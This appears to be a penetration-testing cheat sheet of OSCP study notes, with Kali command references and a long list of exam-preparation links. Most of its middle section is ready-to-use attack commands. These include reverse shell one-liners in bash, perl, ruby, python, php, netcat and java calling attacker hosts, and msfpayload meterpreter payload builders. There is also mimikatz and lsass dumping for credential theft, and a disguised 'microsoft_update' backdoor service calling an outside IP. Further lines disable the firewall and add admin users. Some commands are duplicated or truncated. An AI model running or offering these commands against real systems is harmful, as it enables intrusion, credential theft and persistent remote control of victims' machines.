Kali Linux
========================================================================================================

-   Set the Target IP Address to the `$ip` system variable  
    `export ip=192.168.1.100`

-   Find the location of a file  
    `locate sbd.exe`

-   Search through directories in the `$PATH` environment variable  
    `which sbd`

-   Find a search for a file that contains a specific string in it’s
    name:  
    `find / -name sbd\*`

-   Show active internet connections  
    `netstat -lntp`

-   Change Password  
    `passwd`

-   Verify a service is running and listening  
    `netstat -antp |grep apache`

-   Start a service  
    `systemctl start ssh  `

    `systemctl start apache2`

-   Have a service start at boot  
    `systemctl enable ssh`

-   Stop a service  
    `systemctl stop ssh`

-   Unzip a gz file  
    `gunzip access.log.gz`

-   Unzip a tar.gz file  
    `tar -xzvf file.tar.gz`

-   Search command history  
    `history | grep phrase_to_search_for`

-   Download a webpage  
    `wget http://www.cisco.com`

-   Open a webpage  
    `curl http://www.cisco.com`

-   String manipulation

    -   Count number of lines in file  
        `wc -l index.html`

    -   Get the start or end of a file  
        `head index.html`

        `tail index.html`

    -   Extract all the lines that contain a string  
        `grep "href=" index.html`

    -   Cut a string by a delimiter, filter results then sort  
        `grep "href=" index.html | cut -d "/" -f 3 | grep "\\." | cut -d '"' -f 1 | sort -u`

    -   Using Grep and regular expressions and output to a file  
        `cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort –u > list.txt`

    -   Use a bash loop to find the IP address behind each host  
        `for url in $(cat list.txt); do host $url; done`

    -   Collect all the IP Addresses from a log file and sort by
        frequency  
        `cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn`

-   Decoding using Kali

    -   Decode Base64 Encoded Values

        `echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 --decode`

    -   Decode Hexidecimal Encoded Values  
        `echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps`

-   Netcat - Read and write TCP and UDP Packets

    -   Download Netcat for Windows (handy for creating reverse shells and transfering files on windows systems):
        [https://joncraton.org/blog/46/netcat-for-windows/](https://joncraton.org/blog/46/netcat-for-windows/)

    -   Connect to a POP3 mail server  
        `nc -nv $ip 110`

    -   Listen on TCP/UDP port  
        `nc -nlvp 4444`

    -   Connect to a netcat port  
        `nc -nv $ip 4444`

    -   Send a file using netcat  
        `nc -nv $ip 4444 < /usr/share/windows-binaries/wget.exe`

    -   Receive a file using netcat  
        `nc -nlvp 4444 > incoming.exe`

    -   Some OSs (OpenBSD) will use nc.traditional rather than nc so watch out for that...

            whereis nc
            nc: /bin/nc.traditional /usr/share/man/man1/nc.1.gz

            /bin/nc.traditional -e /bin/bash 1.2.3.4 4444


    -   Create a reverse shell with Ncat using cmd.exe on Windows  
        `nc.exe -nlvp 4444 -e cmd.exe`

        or

        `nc.exe -nv <Remote IP> <Remote Port> -e cmd.exe`

    -   Create a reverse shell with Ncat using bash on Linux  
        `nc -nv $ip 4444 -e /bin/bash`

    -   Netcat for Banner Grabbing:

        `echo "" | nc -nv -w1 <IP Address> <Ports>`

-   Ncat - Netcat for Nmap project which provides more security avoid
    IDS

    -   Reverse shell from windows using cmd.exe using ssl  
        `ncat --exec cmd.exe --allow $ip -vnl 4444 --ssl`

    -   Listen on port 4444 using ssl  
        `ncat -v $ip 4444 --ssl`

-   Wireshark
    -   Show only SMTP (port 25) and ICMP traffic:

        `tcp.port eq 25 or icmp`

    -   Show only traffic in the LAN (192.168.x.x), between workstations and servers -- no Internet:

        `ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16`

    -   Filter by a protocol ( e.g. SIP ) and filter out unwanted IPs:

        `ip.src != xxx.xxx.xxx.xxx && ip.dst != xxx.xxx.xxx.xxx && sip`

    -   Some commands are equal

        `ip.addr == xxx.xxx.xxx.xxx`

         Equals

        `ip.src == xxx.xxx.xxx.xxx or ip.dst == xxx.xxx.xxx.xxx `

        ` ip.addr != xxx.xxx.xxx.xxx`

         Equals

        `ip.src != xxx.xxx.xxx.xxx or ip.dst != xxx.xxx.xxx.xxx`

-   TCP Dump

    -   Display a pcap file  
       `tcpdump -r passwordz.pcap`

    -   Display ips and filter and sort  
        `tcpdump -n -r passwordz.pcap | awk -F" " '{print $3}' | sort -u | head`

    -   Grab a packet capture on port 80  
        `tcpdump tcp port 80 -w output.pcap -i eth0`

    -   Check for ACK or PSH flag set in a TCP packet  
        `tcpdump -A -n 'tcp[13] = 24' -r passwordz.pcap`

-   IP Tables 

    -   Deny traffic to ports except for Local Loopback

        `iptables -A INPUT -p tcp --destination-port 13327 ! -d $ip -j DROP  `

        `iptables -A INPUT -p tcp --destination-port 9991 ! -d $ip -j DROP`

    -   Clear ALL IP Tables firewall rules

            
            iptables -P INPUT ACCEPT
            iptables -P FORWARD ACCEPT
            iptables -P OUTPUT ACCEPT
            iptables -t nat -F
            iptables -t mangle -F
            iptables -F
            iptables -X
            iptables -t raw -F iptables -t raw -X
            
## Nmap Full Web Vulnerable Scan:

`mkdir /usr/share/nmap/scripts/vulscan`

`cd /usr/share/nmap/scripts/vulscan`

`wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz && tar xzf nmap_nse_vulscan-2.0.tar.gz`

`nmap -sS -sV –script=vulscan/vulscan.nse target`

`nmap -sS -sV –script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target`

`nmap -sS -sV –script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target`

`nmap -PN -sS -sV –script=vulscan –script-args vulscancorrelation=1 -p80 target`

`nmap -sV –script=vuln target`

`nmap -PN -sS -sV –script=all –script-args vulscancorrelation=1 target`


## Dirb Directory Bruteforce:
`dirb http://IP:PORT dirbuster-ng-master/wordlists/common.txt`

## Nikto Scanner:
`nikto -C all -h http://IP`

## WordPress Scanner:
`wpscan –url http://IP/ –enumerate p`

## HTTP Enumeration:
`httprint -h http://www.example.com -s signatures.txt`

## SKIP Fish Scanner:
`skipfish -m 5 -LVY -W /usr/share/skipfish/dictionaries/complete.wl -u http://IP`

## Uniscan Scanning:
`uniscan –u target –qweds`
````
-q – Enable Directory checks
-w – Enable File Checks
-e – Enable robots.txt and sitemap.xml check
-d – Enable Dynamic checks
-s – Enable Static checks
````

## Skipfish Scanning:
`skipfish -m 5 -LVY -W /usr/share/skipfish/dictionaries/complete.wl -u http://IP`

## Nmap Ports Scan:

1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys)

2)fargement

3)data packed – like orginal one not scan packet

4)use auxiliary/scanner/ip/ipidseq for find zombie ip in network to use them to scan — nmap -sI ip target

5) nmap –source-port 53 target

`nmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu=24 –data-length=1337 -T2 target (Randomize scan form diff IP)`

`nmap -Pn -T2 -sV –randomize-hosts IP1,IP2`

`nmap –script smb-check-vulns.nse -p445 target (using NSE scripts)`

`nmap -sU -P0 -T Aggressive -p123 target (Aggresive Scan T1-T5)`

`nmap -sA -PN -sN target`

`nmap -sS -sV -T5 -F -A -O target (version detection)`

`nmap -sU -v target (UDP)`

`nmap -sU -P0 (UDP)`

`nmap -sC 192.168.31.10-12 (all scan default)`

## Netcat Scanning:
`nc -v -w 1 target -z 1-1000`

`for i in {10..12}; do nc -vv -n -w 1 192.168.34.$i 21-25 -z; done`

## US Scanning:
`us -H -msf -Iv 192.168.31.20 -p 1-65535 && us -H -mU -Iv 192.168.31.20 -p 1-65535`

## Unicornscan Scanning:
`unicornscan X.X.X.X:a -r10000 -v`

## Kernel Scanning:
`xprobe2 -v -p tcp:80:open 192.168.6.66`

## Samba Enumeartion:
`nmblookup -A target`

`smbclient //MOUNT/share -I target -N`

`rpcclient -U “” target`

`enum4linux target`

## SNMP ENumeration:
`snmpget -v 1 -c public IP version`

`snmpwalk -v 1 -c public IP`

`snmpbulkwalk -v 2 -c public IP`

## Windows Useful commands:
`net localgroup Users`

`net localgroup Administrators`

`search dir/s *.doc`

`system(“start cmd.exe /k $cmd”)`

`sc create microsoft_update binpath=”cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe” start= auto error= ignore`

`/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779`

`mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords”`

`Procdump.exe -accepteula -ma lsass.exe lsass.dmp`

`mimikatz.exe “sekurlsa::minidump lsass.dmp” “log” “sekurlsa::logonpasswords”`

`C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits`

`C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits`


## Plink Tunnel:
`plink.exe -P 22 -l root -pw “1234” -R 445:127.0.0.1:445 X.X.X.X`

## Enable RDP Access:
`reg add “hklm\system\currentcontrolset\control\terminal server” /f /v fDenyTSConnections /t REG_DWORD /d 0`

`netsh firewall set service remoteadmin enable`

`netsh firewall set service remotedesktop enable`

## Turn Off Firewall:
`netsh firewall set opmode disable`

## Meterpreter:
`run getgui -u admin -p 1234`

`run vnc -p 5043`

## Add User Windows:
`net user test 1234 /add`

`net localgroup administrators test /add`

## Mimikatz:
`privilege::debug`

`sekurlsa::logonPasswords full`

## Passing the Hash:
`pth-winexe -U hash //IP cmd`

## Password Cracking using Hashcat:
`hashcat -m 400 -a 0 hash /root/rockyou.txt`

## Netcat commands:
`c:> nc -l -p 31337`

`nc 192.168.0.10 31337`

`c:> nc -v -w 30 -p 31337 -l < secret.txt`

`nc -v -w 2 192.168.0.10 31337 > secret.txt`

## Banner Grabbing:
`nc 192.168.0.10 80`

```
GET / HTTP/1.1

Host: 192.168.0.10

User-Agent: SPOOFED-BROWSER

Referrer: K0NSP1RACY.COM

<enter>

<enter>
````


## Windows Reverse Shell:
`c:>nc -Lp 31337 -vv -e cmd.exe`

`nc 192.168.0.10 31337`

`c:>nc rogue.k0nsp1racy.com 80 -e cmd.exe`

`nc -lp 80`

`nc -lp 31337 -e /bin/bash`

`nc 192.168.0.11 31337`

`nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000`

## Find all SUID root files:
`find / -user root -perm -4000 -print`

## Find all SGID root files:
`find / -group root -perm -2000 -print`

## Find all SUID and SGID files owned by anyone:
`find / -perm -4000 -o -perm -2000 -print`

## Find all files that are not owned by any user:
`find / -nouser -print`

## Find all files that are not owned by any group:
`find / -nogroup -print`

## Find all symlinks and what they point to:
`find / -type l -ls`

## Python:
`python -c ‘import pty;pty.spawn(“/bin/bash”)’`

`python -m SimpleHTTPServer (Starting HTTP Server)`

## PID:
`fuser -nv tcp 80 (list PID of process)`

`fuser -k -n tcp 80 (Kill Process of PID)`

## Hydra:
`hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp (Self Explanatory)`

## Mount Remote Windows Share:
`smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw`

## Compiling Exploit in Kali:
`gcc -m32 -o output32 hello.c (32 bit)`

`gcc -o output hello.c (64 bit)`

## Compiling Windows Exploits on Kali:
`cd /root/.wine/drive_c/MinGW/bin`

`wine gcc -o ability.exe /tmp/exploit.c -lwsock32`

`wine ability.exe`

## NASM Command:
`nasm -f bin -o payload.bin payload.asm`

`nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload`

## SSH Pivoting:
`ssh -D 127.0.0.1:1080 -p 22 user@IP`

Add socks4 127.0.0.1 1080 in /etc/proxychains.conf

`proxychains commands target`

## Pivoting to One Network to Another:
`ssh -D 127.0.0.1:1080 -p 22 user1@IP1`

Add socks4 127.0.0.1 1080 in /etc/proxychains.conf

`proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2`

Add socks4 127.0.0.1 1081 in /etc/proxychains.conf

`proxychains commands target`

## Pivoting Using metasploit:
````
route add 10.1.1.0 255.255.255.0 1
route add 10.2.2.0 255.255.255.0 1
use auxiliary/server/socks4a
run
````

`proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E`

## Exploit-DB search using CSV File:
`searchsploit-rb –update`

`searchsploit-rb -t webapps -s WEBAPP`

`searchsploit-rb –search=”Linux Kernel”`

`searchsploit-rb -a “author name” -s “exploit name”`

`searchsploit-rb -t remote -s “exploit name”`

`searchsploit-rb -p linux -t local -s “exploit name”`

## For Privilege Escalation Exploit search
`cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep “<|<=” | sort -k3`

## Metasploit Payloads:
`msfpayload windows/meterpreter/reverse_tcp LHOST=10.10.10.10 X > system.exe`

`msfpayload php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=443 R > exploit.php`

`msfpayload windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=443 R | msfencode -t asp -o file.asp`

`msfpayload windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 R | msfencode -e x86/shikata_ga_nai -b “\x00″ -t c`

## Create a Linux Reverse Meterpreter Binary
`msfpayload linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R | msfencode -t elf -o shell`

## Create Reverse Shell (Shellcode)
`msfpayload windows/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R | msfencode -b “\x00\x0a\x0d”`

## Create a Reverse Shell Python Script
`msfpayload cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R > shell.py`

## Create a Reverse ASP Shell
`msfpayload windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R | msfencode -t asp -o shell.asp`

## Create a Reverse Bash Shell
`msfpayload cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R > shell.sh`

## Create a Reverse PHP Shell
`msfpayload php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R > shell.php`

Edit shell.php in a text editor to add <?php at the beginning.

## Create a Windows Reverse Meterpreter Binary
`msfpayload windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> X >shell.exe`

## Find programs with a set uid bit in Linux
 `find / -uid 0 -perm -4000`

## Find things that are world writable
 `find / -perm -o=w`

## find names with dots and spaces, there shouldn’t be any
 `find / -name ” ” -print`
 `find / -name “..” -print`
 `find / -name “. ” -print`
 `find / -name ” ” -print`

## Find files that are not owned by anyone
`find / -nouser`

## Look for files that are unlinked
`lsof +L1`

## Get information about procceses with open ports
`lsof -i`

## Look for weird things in arp
`arp -a`

## Look at all accounts including AD
`getent passwd`

## Look at all groups and membership including AD
`getent group`

## List crontabs for all users including AD
`for user in $(getent passwd|cut -f1 -d:); do echo “### Crontabs for $user ####”; crontab -u $user -l; done`

## Generate random passwords
`cat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@#$%^&*()_+{}|:<>?=’|fold -w 12| head -n 4`

## Find all immutable files, there should not be any
`find . | xargs -I file lsattr -a file 2>/dev/null | grep ‘^….i’`

## Fix immutable files
`chattr -i file`

## BASH:
`bash -i >& /dev/tcp/192.168.23.10/443 0>&1`

`exec /bin/bash 0&0 2>&0`

`exec /bin/bash 0&0 2>&0`

`0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196`

`0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196`

`exec 5<>/dev/tcp/attackerip/4444 cat <&5 | while read line; do $line 2>&5 >&5; done # or: while read line 0<&5; do $line 2>&5 >&5; done`

`exec 5<>/dev/tcp/attackerip/4444`

`cat <&5 | while read line; do $line 2>&5 >&5; done # or:`

`while read line 0<&5; do $line 2>&5 >&5; done`

`/bin/bash -i > /dev/tcp/attackerip/8080 0<&1 2>&1`

`/bin/bash -i > /dev/tcp/192.168.23.10/443 0<&1 2>&1`


## PERL:
Shorter Perl reverse shell that does not depend on /bin/sh:

`perl -MIO -e ‘$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,”attackerip:4444″);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’`

`perl -MIO -e ‘$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,”attackerip:4444″);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’`

If the target system is running Windows use the following one-liner:

`perl -MIO -e ‘$c=new IO::Socket::INET(PeerAddr,”attackerip:4444″);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’`

`perl -MIO -e ‘$c=new IO::Socket::INET(PeerAddr,”attackerip:4444″);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’`

`perl -e ‘use Socket;$i=”10.0.0.1″;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’`

`perl -e ‘use Socket;$i=”10.0.0.1″;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’`

## RUBY:
Longer Ruby reverse shell that does not depend on /bin/sh:

`ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(“attackerip”,”4444″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’`

`ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(“attackerip”,”4444″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’`

If the target system is running Windows use the following one-liner:

`ruby -rsocket -e ‘c=TCPSocket.new(“attackerip”,”4444″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’`

`ruby -rsocket -e ‘c=TCPSocket.new(“attackerip”,”4444″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’`

`ruby -rsocket -e’f=TCPSocket.open(“attackerip”,1234).to_i;exec sprintf(“/bin/sh -i <&%d >&%d 2>&%d”,f,f,f)’`

`ruby -rsocket -e’f=TCPSocket.open(“attackerip”,1234).to_i;exec sprintf(“/bin/sh -i <&%d >&%d 2>&%d”,f,f,f)’`

## PYTHON:
`python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.0.0.1″,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’`

`python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.0.0.1″,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’`

## PHP:
This code assumes that the TCP connection uses file descriptor 3.

`php -r ‘$sock=fsockopen(“10.0.0.1″,1234);exec(“/bin/sh -i <&3 >&3 2>&3″);’`

`php -r ‘$sock=fsockopen(“10.0.0.1″,1234);exec(“/bin/sh -i <&3 >&3 2>&3″);’`

## NETCAT:
Other possible Netcat reverse shells, depending on the Netcat version and compilation flags:

`nc -e /bin/sh attackerip 4444`

`nc -e /bin/sh 192.168.37.10 443`

If the -e option is disabled, try this

`mknod backpipe p && nc 192.168.23.10 443 0<backpipe | /bin/bash 1>backpipe`

`mknod backpipe p && nc attackerip 8080 0<backpipe | /bin/bash 1>backpipe`

`/bin/sh | nc attackerip 4444`

`/bin/sh | nc 192.168.23.10 443`

`rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/`

`rm -f /tmp/p; mknod /tmp/p p && nc 192.168.23.10 444 0/tmp/`

If you have the wrong version of netcat installed, try

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.23.10 >/tmp/f`

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`

## TELNET:
If netcat is not available or /dev/tcp

`mknod backpipe p && telnet attackerip 8080 0<backpipe | /bin/bash 1>backpipe`

`mknod backpipe p && telnet attackerip 8080 0<backpipe | /bin/bash 1>backpipe`

## XTERM:
Xterm is the best..

To catch incoming xterm, start an open X Server on your system (:1 – which listens on TCP port 6001). One way to do this is with Xnest: It is available on Ubuntu.

Xnest :1 # Note: The command starts with uppercase X

Xnest :1 # Note: The command starts with uppercase X

Then remember to authorise on your system the target IP to connect to you:
xterm -display 127.0.0.1:1 # Run this OUTSIDE the Xnest, another tab xhost +targetip # Run this INSIDE the spawned xterm on the open X Server

xterm -display 127.0.0.1:1 # Run this OUTSIDE the Xnest, another tab
xhost +targetip # Run this INSIDE the spawned xterm on the open X Server

If you want anyone to connect to this spawned xterm try:
xhost + # Run this INSIDE the spawned xterm on the open X Server
xhost + # Run this INSIDE the spawned xterm on the open X Server

Then on the target, assuming that xterm is installed, connect back to the open X Server on your system:
xterm -display attackerip:1
xterm -display attackerip:1

Or:
$ DISPLAY=attackerip:0 xterm
$ DISPLAY=attackerip:0 xterm

It will try to connect back to you, attackerip, on TCP port 6001.
Note that on Solaris xterm path is usually not within the PATH environment variable, you need to specify its filepath:

/usr/openwin/bin/xterm -display attackerip:1
/usr/openwin/bin/xterm -display attackerip:1


## PHP:
`php -r ‘$sock=fsockopen(“192.168.0.100″,4444);exec(“/bin/sh -i <&3 >&3 2>&3″);’`

## JAVA:
`r = Runtime.getRuntime()
p = r.exec([“/bin/bash”,”-c”,”exec 5<>/dev/tcp/192.168.0.100/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done”] as String[])
p.waitFor()`

-----

# OSCP Experience
Below are the blogs I found to help prepare me for the course

https://www.hacksplaining.com/

http://www.abatchy.com/search/label/OSCP%20Prep

http://www.techexams.net/forums/security-certifications/113355-list-recent-oscp-threads.html

http://www.jasonbernier.com/oscp-review/

https://localhost.exposed/path-to-oscp/

https://pinboard.in/u:unfo/t:oscp

# Metasploit 
Although its use is limited during the exam, Offensive Security recommends getting more familiar with the tool.

https://www.offensive-security.com/metasploit-unleashed/

https://community.rapid7.com/community/metasploit/blog/2016/11/15/test-your-might-with-the-shiny-new-metasploitable3

# Linux Exploitation

https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/

# TCP Dump

https://danielmiessler.com/study/tcpdump/

# Enumeration

https://hackercool.com/2016/07/smb-enumeration-with-kali-linux-enum4linuxacccheck-smbmap/

https://null-byte.wonderhowto.com/how-to/hack-like-pro-reconnaissance-with-recon-ng-part-1-getting-started-0169854/

http://0daysecurity.com/penetration-testing/enumeration.html

# Cheat Sheets for All the Things!!!!!!!

https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf

https://highon.coffee/blog/nmap-cheat-sheet/

http://www.cheat-sheets.org/saved-copy/Notepad++_Cheat_Sheet.pdf

http://www.isical.ac.in/~pdslab/2016/lectures/bash_cheat_sheet.pdf

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

https://www.sans.org/security-resources/GoogleCheatSheet.pdf

https://www.tunnelsup.com/python-cheat-sheet/

https://www.tunnelsup.com/metasploit-cheat-sheet/

# Reverse and Bind Shell tutorials

http://resources.infosecinstitute.com/icmp-reverse-shell/#gref

# Text Editor Cheat Sheets

https://vim.rtorr.com/ - Vim

# OSCP Report Templates

Original template was created by Offensive Security and can be found here:
https://www.offensive-security.com/pwk-online/PWKv1-REPORT.doc

OSCP Exam Report Template Download
https://github.com/whoisflynn/OSCP-Exam-Report-Template/blob/master/OSCP-OS-XXXXX-Exam-Report_Template3.2.docx?raw=true

OSCP Lab Report Template Download
https://github.com/whoisflynn/OSCP-Exam-Report-Template/blob/master/OSCP-OS-XXXXX-Lab-Report_Template3.2.docx?raw=true

-----

# USEFUL LINKS

List of resources for developing your skillset for the upcoming OSCP exam

## OSCP Rules & Documents

[Exam Guide](https://support.offensive-security.com/#!oscp-exam-guide.md)

## Practice

[Exploit Exercises](https://exploit-exercises.com/)

[OverTheWire - Wargames](https://overthewire.org/wargames/)

[Hack This Site](https://www.hackthissite.org/)

[Flare-On](http://www.flare-on.com/)

[Reverse Engineering Challenges](https://challenges.re/)

[CTF Learn](https://ctflearn.com/)

[Mystery Twister - Crypto Challenges](https://www.mysterytwisterc3.org/en/)

## Binary Exploitation

[Binary Exploitation ELI5](https://medium.com/@danielabloom/binary-exploitation-eli5-part-1-9bc23855a3d8)

[Exploit Development Roadmap](https://www.reddit.com/r/ExploitDev/comments/7zdrzc/exploit_development_learning_roadmap/)

## General OSCP Guides/Resources

https://infosecuritygeek.com/my-oscp-journey/

https://tulpa-security.com/2016/09/19/prep-guide-for-offsecs-pwk/

https://tulpasecurity.files.wordpress.com/2016/09/tulpa-pwk-prep-guide1.pdf

https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob.html

https://www.securitysift.com/offsec-pwb-oscp/

https://www.youtube.com/playlist?list=PLidcsTyj9JXK-fnabFLVEvHinQ14Jy5tf

https://forum.hackthebox.com/t/a-script-kiddie-s-guide-to-passing-oscp-on-your-first-attempt/1471

https://parthdeshani.medium.com/how-to-pass-oscp-like-boss-b269f2ea99d

## OSCP Reviews/Writeups
https://occultsec.com/2018/04/27/the-oscp-a-process-focused-review/

https://coffeegist.com/security/my-oscp-experience/

https://blog.mallardlabs.com/zero-to-oscp-in-292-days-or-how-i-accidentally-the-whole-thing-part-2/

https://scriptdotsh.com/index.php/2018/04/17/31-days-of-oscp-experience/

https://infosecwriteups.com/how-i-passed-oscp-with-100-points-in-12-hours-without-metasploit-in-my-first-attempt-dc8d03366f33

## Fuzzing

[Fuzzing Adobe Reader](https://kciredor.com/fuzzing-adobe-reader-for-exploitable-vulns-fun-not-profit.html)

## Reverse Engineering

[Reverse Engineering x64 for Beginners](http://niiconsulting.com/checkmate/2018/04/reverse-engineering-x64-for-beginners-linux/)

[Backdoor - Reverse Engineering CTFs](https://backdoor.sdslabs.co/)

[Begin Reverse Engineering: workshop](https://www.begin.re/)

## Pivoting

[The Red Teamer's Guide to Pivoting](https://artkond.com/2017/03/23/pivoting-guide/)

## Github Disovered OSCP Tools/Resources

[OSCP Materials](https://gist.github.com/natesubra/5117959c660296e12d3ac5df491da395)

[Collection of things made during OSCP journey](https://github.com/ihack4falafel/OSCP)

[Notes from Study Plan](https://github.com/ferreirasc/oscp)

[Resource List](https://github.com/secman-pl/oscp)

[Personal Notes for OSCP & Course](https://github.com/generaldespair/OSCP)

[Buffer Overflow Practice](https://github.com/mikaelkall/vuln)

[OSCP Cheat Sheet](https://github.com/mikaelkall/OSCP-cheat-sheet)

[1-liners & notes](https://github.com/gajos112/OSCP)

## Non-Preinstalled Kali Tools

[Doubletap - loud/fast scanner](https://github.com/benrau87/doubletap)

[Reconnoitre - recon for OSCP](https://github.com/codingo/Reconnoitre)

[Pandora's Box - bunch of tools](https://github.com/paranoidninja/Pandoras-Box)

[SleuthQL - SQLi Discovery Tool](https://github.com/RhinoSecurityLabs/SleuthQL)

[Commix - Command Injection Exploiter](https://github.com/commixproject/commix)

## Source Code Review / Analysis

[Static Analysis Tools](https://github.com/mre/awesome-static-analysis)

## Malware Analysis

[Malware Analysis for Hedgehogs (YouTube)](https://www.youtube.com/channel/UCVFXrUwuWxNlm6UNZtBLJ-A) 

## Misc

[Windows Kernel Exploitation](https://rootkits.xyz/blog/2017/06/kernel-setting-up/)

[Bunch of interesting tools/commands](https://github.com/adon90/pentest_compilation)

[Forensics Field Guide](https://trailofbits.github.io/ctf/forensics/)

[Bug Bounty Hunter's Methodology](https://github.com/jhaddix/tbhm)

[**Fantastic** lecture resource for learning assembly](https://www.youtube.com/watch?v=H4Z0S9ZbC0g)

[Awesome WAF bypass/command execution filter bypass](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8)

-----

## General Links

- Exploit interpreter fix: https://askubuntu.com/questions/304999/not-able-to-execute-a-sh-file-bin-bashm-bad-interpreter
- Oscp repo: https://github.com/rewardone/OSCPRepo
- Pentest compilation: https://github.com/adon90/pentest_compilation
- Command Templates: https://pentest.ws
- Password Lists: https://github.com/danielmiessler/SecLists
- Automated OSCP reconnaissance tool: https://github.com/codingo/Reconnoitre
- OSCP Report Template: https://github.com/whoisflynn/OSCP-Exam-Report-Template
- OSCP Scripts: https://github.com/ihack4falafel/OSCP
- Pentesting resource: https://guif.re/
- FTP Binary mode: https://www.jscape.com/blog/ftp-binary-and-ascii-transfer-types-and-the-case-of-corrupt-files
- Pentesting Cheatsheet: https://ired.team/

## Enumeration

- General Enumeration - Common port checks: http://www.0daysecurity.com/penetration-testing/enumeration.html
- Nmap Scripts: https://nmap.org/nsedoc/

## Web

- LFI/RFI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#basic-rfi
- MSSQL Injection: https://www.exploit-db.com/papers/12975
    - MSSQL Union Based Injection: http://www.securityidiots.com/Web-Pentest/SQL-Injection/MSSQL/MSSQL-Union-Based-Injection.html
    - MSSQL SQL Injection Cheat Sheet: http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
- MySQL Injection: http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
- MongoDB Nosql Injection: https://security.stackexchange.com/questions/83231/mongodb-nosql-injection-in-python-code
    - http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
- https://guif.re/webtesting


## Shell Exploitation

- Reverse Shell Cheat Sheet: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- More Reverse Shells: https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
- Even More Reverse shells: https://delta.navisec.io/reverse-shell-reference/
- Spawning TTY Shell: https://netsec.ws/?p=337
